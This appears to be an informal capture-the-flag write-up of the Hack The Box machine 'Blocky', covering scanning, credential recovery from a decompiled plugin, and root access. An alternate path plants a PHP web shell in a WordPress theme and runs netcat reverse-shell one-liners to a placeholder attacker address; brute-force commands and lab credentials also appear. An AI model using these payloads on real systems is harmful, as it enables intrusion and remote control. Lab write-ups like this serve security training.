first were going to do a nmap scan

```
root@kali:~# nmap -sC -sV -p- 10.10.10.37
Starting Nmap 7.80 ( https://nmap.org/ ) at 2020-07-24 20:56 EDT
Nmap scan report for 10.10.10.37
Host is up (0.096s latency).
Not shown: 65530 filtered ports
PORT      STATE  SERVICE   VERSION
21/tcp    open   ftp       ProFTPD 1.3.5a
22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp    open   http      Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp  closed sophos
25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

and now lets continue reconnaissance and see some directories;

```

root@kali:~# gobuster dir -u http://10.10.10.37/ -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@FireFart)
===============================================================
[+] Url:            http://10.10.10.37/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/24 21:00:23 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.php (Status: 301)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/plugins (Status: 301)
/server-status (Status: 403)
/wiki (Status: 301)
/wp-admin (Status: 301)
/wp-content (Status: 301)
/wp-includes (Status: 301)

```
investigating them  we can see that /puligns could be interesting so when heading there were greeted with 2 files





installing them i can see that the Blockyclass is smaller so lets start with that, we can see that its something similar to a zip file and we get to the final file which is BlockyCore.class and doing a cat read of the file we get this;

```
root@kali:~/Documents/CTF/HTB/blocky# cat  BlockyCore.class
����4-com/myfirstplugin/BlockyCorejava/lang/ObjectsqlHostLjava/lang/String;sqlUsersqlPass<init>()VCode




        localhost
                       root
                               8YsqfCTnvxAUeduzjNSXe22
onServerStart                                          LineNumberTableLocalVariableTablethisLcom/myfirstplugin/BlockyCore;
             onServerStop
                         onPlayerJoi"TODO get usernam$!Welcome to the BlockyCraft!!!!!!!
&
'(
   sendMessage'(Ljava/lang/String;Ljava/lang/String;)usernamemessage
SourceFileBlockyCore.java!

Q*�
   ��*�▒�▒

▒

▒

7       !#�%�▒
        (
         ?�▒)+,
```

we can see from the text that i have highlight we might have come across a password of sorts, but we scan still do better since this file is unreadable ffs, so i investigated and a .class file is a java class file and what were going to do now is to simply decompile it online because im a fucking shitter who doesnt know the tools in the command line and when decompiled we get this piece of art;
```
package com.myfirstplugin;


public class BlockyCore
{
    public String sqlHost;
    public String sqlUser;
    public String sqlPass;


    public BlockyCore() {
        this.sqlHost = "localhost";
        this.sqlUser = "root";
        this.sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
    }


    public void onServerStart() {
    }


    public void onServerStop() {
    }


    public void onPlayerJoin() {
        this.sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
    }


    public void sendMessage(final String username, final String message) {
    }
}
```

and now we gotta login to through something and i tested this password and username for the SSH dint work, i tried the notch username and then it worked
```
root@kali:~/Documents/CTF/HTB/blocky# ssh notch@10.10.10.37
notch@10.10.10.37's password:
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)


* Documentation:  https://help.ubuntu.com/
* Management:     https://landscape.canonical.com/
* Support:        https://ubuntu.com/advantage


7 packages can be updated.
7 updates are security updates.




Last login: Sun Dec 24 09:34:35 2017
notch@Blocky:~$ ls
minecraft  user.txt
notch@Blocky:~$ cat user.txt
59f#############################
```


uhh well that was so much fucking easier than i had actually thought but lets continue to find root and now were going to transfer over linpeas les and various other tools, but before we actually do thta lets try the basics of privilege escalation, lets try simple sudo commands;
```
notch@Blocky:/tmp$ sudo su
[sudo] password for notch:
Sorry, try again.
[sudo] password for notch:
root@Blocky:/tmp# cd /home/
root@Blocky:/home# cd 
root@Blocky:/# ls
bin  boot  dev  etc  home  initrd.img  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  vmlinuz
root@Blocky:/# cd root
root@Blocky:~# ls
root.txt
root@Blocky:~# cat root.txt
0a9694a5b4d272c694679f7860f1cd5f
```
well shit that's alot fucking easier than expected i guess

---
Recon v2

theres this scanner for OSCP that we can maybe use called RECONNOITRE and then after the scan you do a simple 
```
cat *find*
root@kali:~/Documents/CTF/HTB/blocky/10.10.10.37/scans# cat *find*
[*] Found FTP service on 10.10.10.37:21
   [*] Enumeration
      [=] nmap -sV -Pn -vv -p21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -oA '/root/Documents/CTF/HTB/blocky/10.10.10.37/scans/10.10.10.37_21_ftp' 10.10.10.37
      [=] hydra -L USER_LIST -P PASS_LIST -f -o /root/Documents/CTF/HTB/blocky/10.10.10.37/scans/10.10.10.37_21_ftphydra.txt -u 10.10.10.37 -s 21 ftp




[*] Found SSH service on 10.10.10.37:22
   [*] Bruteforcing
      [=] medusa -u root -P /usr/share/wordlists/rockyou.txt -e ns -h 10.10.10.37 - 22 -M ssh
      [=] hydra -f -V -t 1 -l root -P /usr/share/wordlists/rockyou.txt -s 22 10.10.10.37 ssh
      [=] ncrack -vv -p 22 --user root -P PASS_LIST 10.10.10.37
   [*] Use nmap to automate banner grabbing and key fingerprints, e.g.
      [=] nmap 10.10.10.37 -p 22 -sV --script=ssh-hostkey -oA '/root/Documents/CTF/HTB/blocky/10.10.10.37/scans/10.10.10.37_22_ssh-hostkey'




[*] Found HTTP/S service on 10.10.10.37:80
   [*] Enumeration
      [=] nikto -h 10.10.10.37 -p 80 -output /root/Documents/CTF/HTB/blocky/10.10.10.37/scans/10.10.10.37_80_nikto.txt
      [=] curl -i 10.10.10.37:80
      [=] w3m -dump 10.10.10.37/robots.txt | tee /root/Documents/CTF/HTB/blocky/10.10.10.37/scans/10.10.10.37_80_robots.txt
      [=] VHostScan -t 10.10.10.37 -oN /root/Documents/CTF/HTB/blocky/10.10.10.37/scans/10.10.10.37_80_vhosts.txt




[*] Found HTTP service on 10.10.10.37:80
   [*] Enumeration
      [=] dirb http://10.10.10.37:80/ -o /root/Documents/CTF/HTB/blocky/10.10.10.37/scans/10.10.10.37_80_dirb.txt
      [=] dirbuster -H -u http://10.10.10.37:80/ -l /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 20 -s / -v -r /root/Documents/CTF/HTB/blocky/10.10.10.37/scans/10.10.10.37_80_dirbuster_medium.txt
      [=] gobuster -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.37:80/ -s '200,204,301,302,307,403,500' -e | tee '/root/Documents/CTF/HTB/blocky/10.10.10.37/scans/10.10.10.37_80_gobuster_common.txt'
      [=] gobuster -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -u http://10.10.10.37:80/ -s '200,204,301,307,403,500' -e | tee '/root/Documents/CTF/HTB/blocky/10.10.10.37/scans/10.10.10.37_80_gobuster_cgis.txt'



```


Recon v3
Using wp scan is also possible to use in this situation
```
root@kali:~/Documents/CTF/HTB/blocky/10.10.10.37/scans# wpscan --url http://10.10.10.37 --enumerate u,ap,tt,t
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|


         WordPress Security Scanner by the WPScan Team
                         Version 3.7.8
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________


[+] URL: http://10.10.10.37/
[+] Started: Sun Jul 26 22:40:09 2020


Interesting Finding(s):


[+] http://10.10.10.37/
| Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
| Found By: Headers (Passive Detection)
| Confidence: 100%


[+] http://10.10.10.37/xmlrpc.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%
| References:
|  - http://codex.wordpress.org/XML-RPC_Pingback_API
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
|  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access


[+] http://10.10.10.37/readme.html
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%


[+] Upload directory has listing enabled: http://10.10.10.37/wp-content/uploads/
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%


[+] http://10.10.10.37/wp-cron.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 60%
| References:
|  - https://www.iplocation.net/defend-wordpress-from-ddos
|  - https://github.com/wpscanteam/wpscan/issues/1299


[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
| Found By: Rss Generator (Passive Detection)
|  - http://10.10.10.37/index.php/feed/, <generator>https://wordpress.org/?v=4.8</generator>
|  - http://10.10.10.37/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>


[+] WordPress theme in use: twentyseventeen
| Location: http://10.10.10.37/wp-content/themes/twentyseventeen/
| Last Updated: 2020-03-31T00:00:00.000Z
| Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt
| [!] The version is out of date, the latest version is 2.3
| Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8
| Style Name: Twenty Seventeen
| Style URI: https://wordpress.org/themes/twentyseventeen/
| Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
| Author: the WordPress team
| Author URI: https://wordpress.org/
|
| Found By: Css Style In Homepage (Passive Detection)
|
| Version: 1.3 (80% confidence)
| Found By: Style (Passive Detection)
|  - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'


[+] Enumerating All Plugins (via Passive Methods)


[i] No plugins Found.


[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
Checking Known Locations - Time: 00:00:09 <===============================================================================================================> (400 / 400) 100.00% Time: 00:00:09
[+] Checking Theme Versions (via Passive and Aggressive Methods)


[i] Theme(s) Identified:


[+] twentyfifteen
| Location: http://10.10.10.37/wp-content/themes/twentyfifteen/
| Last Updated: 2020-03-31T00:00:00.000Z
| Readme: http://10.10.10.37/wp-content/themes/twentyfifteen/readme.txt
| [!] The version is out of date, the latest version is 2.6
| Style URL: http://10.10.10.37/wp-content/themes/twentyfifteen/style.css
| Style Name: Twenty Fifteen
| Style URI: https://wordpress.org/themes/twentyfifteen/
| Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
| Author: the WordPress team
| Author URI: https://wordpress.org/
|
| Found By: Known Locations (Aggressive Detection)
|  - http://10.10.10.37/wp-content/themes/twentyfifteen/, status: 500
|
| Version: 1.8 (80% confidence)
| Found By: Style (Passive DetePPPPPPPction)
|  - http://10.10.10.37/wp-content/themes/twentyfifteen/style.css, Match: 'Version: 1.8'


[+] twentyseventeen
| Location: http://10.10.10.37/wp-content/themes/twentyseventeen/
| Last Updated: 2020-03-31T00:00:00.000Z
| Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt
| [!] The version is out of date, the latest version is 2.3
| Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css
| Style Name: Twenty Seventeen
| Style URI: https://wordpress.org/themes/twentyseventeen/
| Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
| Author: the WordPress team
| Author URI: https://wordpress.org/
|
| Found By: Urls In Homepage (Passive Detection)
| Confirmed By: Known Locations (Aggressive Detection)
|  - http://10.10.10.37/wp-content/themes/twentyseventeen/, status: 500
|
| Version: 1.3 (80% confidence)
| Found By: Style (Passive Detection)
|  - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 1.3'


[+] twentysixteen
| Location: http://10.10.10.37/wp-content/themes/twentysixteen/
| Last Updated: 2020-03-31T00:00:00.000Z
| Readme: http://10.10.10.37/wp-content/themes/twentysixteen/readme.txt
| [!] The version is out of date, the latest version is 2.1
| Style URL: http://10.10.10.37/wp-content/themes/twentysixteen/style.css
| Style Name: Twenty Sixteen
| Style URI: https://wordpress.org/themes/twentysixteen/
| Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
| Author: the WordPress team
| Author URI: https://wordpress.org/
|
| Found By: Known Locations (Aggressive Detection)
|  - http://10.10.10.37/wp-content/themes/twentysixteen/, status: 500
|
| Version: 1.3 (80% confidence)
| Found By: Style (Passive Detection)
|  - http://10.10.10.37/wp-content/themes/twentysixteen/style.css, Match: 'Version: 1.3'


[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
Checking Known Locations - Time: 00:00:52 <=============================================================================================================> (2575 / 2575) 100.00% Time: 00:00:52


[i] No Timthumbs Found.


[+] Enumerating Users (via Passive and Aggressive Methods)
Brute Forcing Author IDs - Time: 00:00:00 <=================================================================================================================> (10 / 10) 100.00% Time: 00:00:00


[i] User(s) Identified:


[+] notch
| Found By: Author Posts - Author Pattern (Passive Detection)
| Confirmed By:
|  Wp Json Api (Aggressive Detection)
|   - http://10.10.10.37/index.php/wp-json/wp/v2/users/?per_page=100&page=1
|  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
|  Login Error Messages (Aggressive Detection)


[+] Notch
| Found By: Rss Generator (Passive Detection)
| Confirmed By: Login Error Messages (Aggressive Detection)


[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up


[+] Finished: Sun Jul 26 22:41:27 2020
[+] Requests Done: 3008
[+] Cached Requests: 47
[+] Data Sent: 747.274 KB
[+] Data Received: 746.818 KB
[+] Memory used: 269.418 MB
[+] Elapsed time: 00:01:17
```



Ippsec

ok so copy the public key of the ssh from you to there;
```
root@kali:~/Documents/CTF/HTB/blocky/10.10.10.37/scans# ssh notch@10.10.10.37
notch@10.10.10.37's password:
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)


* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/advantage


7 packages can be updated.
7 updates are security updates.




Last login: Sun Jul 26 00:47:38 2020 from 10.10.14.2
notch@Blocky:~$ cd /var/
notch@Blocky:/var$ ls
backups  cache  crash  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www
notch@Blocky:/var$ cd www
notch@Blocky:/var/www$ cd html
notch@Blocky:/var/www/html$ ls
index.php    plugins      wiki             wp-admin            wp-comments-post.php  wp-config-sample.php  wp-cron.php  wp-links-opml.php  wp-login.php  wp-settings.php  wp-trackback.php
license.txt  readme.html  wp-activate.php  wp-blog-header.php  wp-config.php         wp-content            wp-includes  wp-load.php        wp-mail.php   wp-signup.php    xmlrpc.php
notch@Blocky:/var/www/html$ cat wp-config.php
<?php
/**
* The base configuration for WordPress
*
* The wp-config.php creation script uses this file during the
* installation. You don't have to use the web site, you can
* copy this file to "wp-config.php" and fill in the values.
*
* This file contains the following configurations:
*
* * MySQL settings
* * Secret keys
* * Database table prefix
* * ABSPATH
*
* @link https://codex.wordpress.org/Editing_wp-config.php
*
* @package WordPress
*/


// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');


/** MySQL database username */
define('DB_USER', 'wordpress');




/** MySQL database password */
define('DB_PASSWORD', 'kWuvW2SYsABmzywYRdoD');


/** MySQL hostname */
define('DB_HOST', 'localhost');




/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');


/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');


/**#@+
* Authentication Unique Keys and Salts.
*
* Change these to different unique phrases!
* You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
* You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
*
* @since 2.6.0
*/
define('AUTH_KEY',         ':!e]/qi>EXcqUE!HR}%Su.JL5LA=X~^`@A`U&~Q0+#4.e;H.n9twE~e6Nx8(IXk>');
define('SECURE_AUTH_KEY',  '*=qKv?X$<L:Cd~f=Q2,F#R4r[+|Gq&VXCTvP$|DR]K?6Ni.C%8FsznD`_.%Cp]vx');
define('LOGGED_IN_KEY',    '>pZ*G%0(S%tNOfY4{c]WC@$)fz.6HBMjSEGJ7VKfqW%L-*I.p) V,V/P[@BE[sz~');
define('NONCE_KEY',        '3sESWC)s}-8kN`%;Kx:[VqlNTFG8^_/4,CQW=mXB:N.Yma7-s{lr#L(@dY;;}2e!');
define('AUTH_SALT',        ']Pn2flm@&<!VBVdl2}2uD?1R]b4MthxtfHtCXE{Scy&6O ep8q8&g|Vv1?Qehl4t');
define('SECURE_AUTH_SALT', '-6SA~FbC(PKASZt,%)T=zT7vEdlf M8d>t2Y!r0 jRSCD&Umz!`zW.>@;Y!c8[Y ');
define('LOGGED_IN_SALT',   '^l_.{1.iG2f$s>-vYOila*aa+F#gox7#0$;=vNK$cH]juc6deip,8-|Pl^vSLSE(');
define('NONCE_SALT',       'P!v%i-E&|3V*?LSNt>H:z)QkrF+5)F5%aX9W ]$jO8PHI?2{mNr~J>CTE~Vy>4)|');


/**#@-*/


/**
* WordPress Database Table prefix.
*
* You can have multiple installations in one database if you give each
* a unique prefix. Only numbers, letters, and underscores please!
*/
$table_prefix  = 'wp_';


/**
* For developers: WordPress debugging mode.
*
* Change this to true to enable the display of notices during development.
* It is strongly recommended that plugin and theme developers use WP_DEBUG
* in their development environments.
*
* For information on other constants that can be used for debugging,
* visit the Codex.
*
* @link https://codex.wordpress.org/Debugging_in_WordPress
*/
define('WP_DEBUG', false);


/* That's all, stop editing! Happy blogging. */


/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
        define('ABSPATH', dirname(__FILE__) . '/');


/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
notch@Blocky:/var/www/html$ cat wp-config.php grep pass
<?php
/**
* The base configuration for WordPress
*
* The wp-config.php creation script uses this file during the
* installation. You don't have to use the web site, you can
* copy this file to "wp-config.php" and fill in the values.
*
* This file contains the following configurations:
*
* * MySQL settings
* * Secret keys
* * Database table prefix
* * ABSPATH
*
* @link https://codex.wordpress.org/Editing_wp-config.php
*
* @package WordPress
*/


// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');


/** MySQL database username */
define('DB_USER', 'wordpress');


/** MySQL database password */
define('DB_PASSWORD', 'kWuvW2SYsABmzywYRdoD');


/** MySQL hostname */
define('DB_HOST', 'localhost');


/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');


/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');


/**#@+
* Authentication Unique Keys and Salts.
*
* Change these to different unique phrases!
* You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
* You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
*
* @since 2.6.0
*/
define('AUTH_KEY',         ':!e]/qi>EXcqUE!HR}%Su.JL5LA=X~^`@A`U&~Q0+#4.e;H.n9twE~e6Nx8(IXk>');
define('SECURE_AUTH_KEY',  '*=qKv?X$<L:Cd~f=Q2,F#R4r[+|Gq&VXCTvP$|DR]K?6Ni.C%8FsznD`_.%Cp]vx');
define('LOGGED_IN_KEY',    '>pZ*G%0(S%tNOfY4{c]WC@$)fz.6HBMjSEGJ7VKfqW%L-*I.p) V,V/P[@BE[sz~');
define('NONCE_KEY',        '3sESWC)s}-8kN`%;Kx:[VqlNTFG8^_/4,CQW=mXB:N.Yma7-s{lr#L(@dY;;}2e!');
define('AUTH_SALT',        ']Pn2flm@&<!VBVdl2}2uD?1R]b4MthxtfHtCXE{Scy&6O ep8q8&g|Vv1?Qehl4t');
define('SECURE_AUTH_SALT', '-6SA~FbC(PKASZt,%)T=zT7vEdlf M8d>t2Y!r0 jRSCD&Umz!`zW.>@;Y!c8[Y ');
define('LOGGED_IN_SALT',   '^l_.{1.iG2f$s>-vYOila*aa+F#gox7#0$;=vNK$cH]juc6deip,8-|Pl^vSLSE(');
define('NONCE_SALT',       'P!v%i-E&|3V*?LSNt>H:z)QkrF+5)F5%aX9W ]$jO8PHI?2{mNr~J>CTE~Vy>4)|');


/**#@-*/


/**
* WordPress Database Table prefix.
*
* You can have multiple installations in one database if you give each
* a unique prefix. Only numbers, letters, and underscores please!
*/
$table_prefix  = 'wp_';


/**
* For developers: WordPress debugging mode.
*
* Change this to true to enable the display of notices during development.
* It is strongly recommended that plugin and theme developers use WP_DEBUG
* in their development environments.
*
* For information on other constants that can be used for debugging,
* visit the Codex.
*
* @link https://codex.wordpress.org/Debugging_in_WordPress
*/
define('WP_DEBUG', false);


/* That's all, stop editing! Happy blogging. */


/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
        define('ABSPATH', dirname(__FILE__) . '/');


/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
cat: grep: No such file or directory
cat: pass: No such file or directory
notch@Blocky:/var/www/html$ cat wp-config.php grep pass | grep -i pass
cat: /** MySQL database password */
grepdefine('DB_PASSWORD', 'kWuvW2SYsABmzywYRdoD');
: No such file or directory
cat: pass: No such file or directory
```

always dig for other types of passwords and now we have this password for the account under the name of wordpress, and a localhost username
```
notch@Blocky:/var/www/html$ cd /etc/phpmyadmin/
notch@Blocky:/etc/phpmyadmin$ ls
apache.conf  conf.d  config-db.php  config.footer.inc.php  config.header.inc.php  config.inc.php  htpasswd.setup  lighttpd.conf  phpmyadmin.desktop  phpmyadmin.service
notch@Blocky:/etc/phpmyadmin$ grep -R pass
lighttpd.conf:  auth.backend = "htpasswd"
lighttpd.conf:  auth.backend.htpasswd.userfile = "/etc/phpmyadmin/htpasswd.setup"
grep: htpasswd.setup: Permission denied
apache.conf:            AuthUserFile /etc/phpmyadmin/htpasswd.setup
config.inc.php: * NOTE: do not add security sensitive data to this file (like passwords)
config.inc.php:    $cfg['Servers'][$i]['controlpass'] = $dbpass;
config.inc.php:    /* Uncomment the following to enable logging in to passwordless accounts,
config.inc.php:/* Uncomment the following to enable logging in to passwordless accounts,
config.inc.php:// $cfg['Servers'][$i]['controlpass'] = 'pmapass';
grep: config-db.php: Permission denied
notch@Blocky:/etc/phpmyadmin$ ls -la
total 52
drwxr-xr-x   3 root root     4096 Jul  2  2017 .
drwxr-xr-x 101 root root     4096 Jul 16  2017 ..
-rw-r--r--   1 root root     1448 Mar 30  2016 apache.conf
drwxr-xr-x   2 root root     4096 Jun 17  2016 conf.d
-rw-r-----   1 root www-data  534 Jul  2  2017 config-db.php
-rw-r--r--   1 root root      168 Oct 29  2015 config.footer.inc.php
-rw-r--r--   1 root root      168 Oct 29  2015 config.header.inc.php
-rw-r--r--   1 root root     6319 Jan 30  2016 config.inc.php
-rw-r-----   1 root www-data    8 Jul  2  2017 htpasswd.setup
-rw-r--r--   1 root root      570 Oct 29  2015 lighttpd.conf
-rw-r--r--   1 root root      198 Oct 29  2015 phpmyadmin.desktop
-rw-r--r--   1 root root      295 Oct 29  2015 phpmyadmin.service
notch@Blocky:/etc/phpmyadmin$
```
 and as we can see we don't have permissions to see that config file since it seems like www-data only can and that's Apache so lets go down that route and fuck with apache, so now lets try and login using this password that we have found, and we hve tried top login to phpmyadmin which worked!; 







Exploitation v2/v2.2

Another way to exploit this is to login to phpmyadmin and then to simply just go to the WP_USERS and to go to the notch user and try to log in if that doesnt work then simply save the password just incase 

and then edit it, by firstly doing this
```
php -a
php > echo password_hash('pogchamp', PASSWORD_DEFAULT);
$2y$10$tLbs5SLQR5RimzMllkByfeHbqE3CuK6yBa/HPrmx2JrZ8E2bXYM9q
```


and then log into wordpress and using the username of notch go to the themes and then the editor, edit the file of the header and you can insert a file for a reverse connection and then paste this
```
<?php echo system($_REQUEST('ipp'));
```

and then after that you can go to the url and put in the following since remember for PHP your RCE is the URL
```
http://10.10.10.37/?ipp=nc -e /bin/bash XX.XX.XX.XX XXXXX
```
 but it seems like this doesnt work so lets check if nc is even on the box using a basic pentestmonkey script
```
http://10.10.10.37/?ipp=which nc
```
and it should show e have nc on the box so lets go to pentestmonkey for a nc reverse shell then;
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc XX.XX.XX.XX XXXX >/tmp/f
```
and to do this we have to enter in the url 
```
10.10.10.37/?ipp=ls
```
and before pressing enter turn on froxyproxy and then turn on buprsuite to intercept the request, send the request to repeater and then highlight the ip=ls part and press change request method 

and after that paste the script and it should be at the bottom

and the last step should be to URL encode it

 and ofcourse recheck your ip, and remember to have a netcat listening on standby for that shell and then boom you should get shell after pressing go on the request!! and ofcourse after that you want tto try and spawn a tty shell or some shit
```
listening on [any] 1234 ... 
connect to [10.10.14.13] from (UNKNOWN)
$python3 -c 'import pty; pty.spawn("/bin/sh")'
^Z

root@kali:~/Documents/CTF/HTB/blocky# stty -a
root@kali:~/Documents/CTF/HTB/blocky# stty raw -echo
root@kali:~/Documents/CTF/HTB/blocky# nc -lvnp 1234

www-data@Blocky:/var/www/html$ stty row 50 col 189
```

and now that were in the apache server can see that wp-config file we canted to before
```
www-data@Blocky:/var/www/html$ cd /etc/phpmyadmin
www-data@Blocky:/etc/phpmyadmin$ cat config-db.php
www-data@Blocky:/etc/phpmyadmin# cat config-db.php
<?php
##
## database access settings in php format
## automatically generated from /etc/dbconfig-common/phpmyadmin.conf
## by /usr/sbin/dbconfig-generate-include
##
## by default this file is managed via ucf, so you shouldn't have to
## worry about manual changes being silently discarded.  however,
## you'll probably also want to edit the configuration file mentioned
## above too.
##
$dbuser='phpmyadmin';
$dbpass='8YsqfCTnvxAUeduzjNSXe22';
$basepath='';
$dbname='phpmyadmin';
$dbserver='localhost';
$dbport='';
$dbtype='mysql';
```

this password that we see we could
```
su - 
[sudo] password for notch:
```

Ippsec Privilege escalation v2
here looking at the exploit suggester we see multiple but the one that i have seen in a walkthrough was the dccp one, simply just compile it and the compile version should be sent to the box via python simple http server, but this exploit os hella fucking unstable

 


